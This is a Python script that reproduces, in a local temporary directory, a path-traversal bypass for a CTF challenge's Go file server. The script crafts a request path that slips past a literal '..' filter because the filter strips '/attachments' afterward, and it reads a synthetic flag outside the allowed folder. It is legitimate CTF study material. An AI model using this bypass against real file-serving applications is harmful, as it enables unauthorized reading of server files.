"""DU CTF secure email attachments: reproduce Go path-cleaning bypass locally.

The input to the filter contains no literal '..'. After the developer's
strings.ReplaceAll(path, '/attachments', '') transformation, dot-dot
path components are formed. The resulting filepath.Join escapes the
attachments directory. No network access or real /etc/flag.txt is used.
"""
import argparse
import posixpath
import re
import tempfile
from pathlib import Path

def validate_source(source: str) -> None:
    required = [
        r'strings\.Contains\(p,\s*"\.\."\)',
        r'strings\.ReplaceAll\(p,\s*"/attachments",\s*""\)',
        r'filepath\.Clean\(strings\.ReplaceAll\(p,\s*"/attachments",\s*""\)\)',
        r'filepath\.Join\("\./attachments",\s*filepath\.Clean',
        r'http\.ServeFile\(c\.Writer,\s*c\.Request,\s*cleanPath\)',
    ]
    for pattern in required:
        if not re.search(pattern, source):
            raise ValueError(f"Original Go path sanitizer changed: {pattern}")

def bypass_path(target: str = "etc/flag.txt", levels: int = 2) -> str:
    """Insert the removed '/attachments' token between '.' characters."""
    if levels < 1 or target.startswith("/") or ".." in target or "\\" in target:
        raise ValueError("Expect a simple relative challenge target and positive depth")
    if any(piece in ("", ".", "..") for piece in target.split("/")):
        raise ValueError("Invalid target components")
    return "/" + "/".join("attachments./attachments." for _ in range(levels)) + "/" + target

def transform_path(requested_path: str) -> str:
    """Model Go code's filter, replacement, Clean, Join on Unix targets."""
    if ".." in requested_path:
        raise ValueError("Request rejected by literal dot-dot filter")
    reduced = requested_path.replace("/attachments", "")
    clean = posixpath.normpath(reduced)
    # Go path.Join cleans the full constructed path; leading slash on
    # reduced value does not discard the explicit attachments base.
    return posixpath.normpath(posixpath.join("./attachments", clean.lstrip("/")))

def escapes_attachments(resolved: str) -> bool:
    norm = posixpath.normpath(resolved)
    return norm == ".." or norm.startswith("../") or not (
        norm == "attachments" or norm.startswith("attachments/")
    )

def local_demo(source: str, marker: str = "DUCTF{SYNTHETIC_LOCAL_TEST}") -> str:
    """Demonstrate reading a marker outside the attachments folder."""
    validate_source(source)
    with tempfile.TemporaryDirectory(prefix="ctf-email-") as tmp:
        root = Path(tmp)
        app = root / "app"
        (app / "attachments").mkdir(parents=True)
        (root / "etc").mkdir()
        (root / "etc" / "flag.txt").write_text(marker, encoding="utf-8")
        requested = bypass_path()
        output = transform_path(requested)
        if not escapes_attachments(output):
            raise ValueError("Payload did not escape attachments")
        resolved = (app / output).resolve()
        if resolved != (root / "etc" / "flag.txt"):
            raise ValueError(f"Unexpected path resolution: {resolved}")
        return resolved.read_text(encoding="utf-8")

def main() -> None:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("source", type=Path, help="Original Go challenge source")
    args = parser.parse_args()
    source = args.source.read_text(encoding="utf-8")
    requested = bypass_path()
    print("Bypass request path:", requested)
    print("Go-equivalent final path:", transform_path(requested))
    print("Locally recovered synthetic marker:", local_demo(source))
    print("No hosted challenge flag was accessed.")

if __name__ == "__main__":
    main()
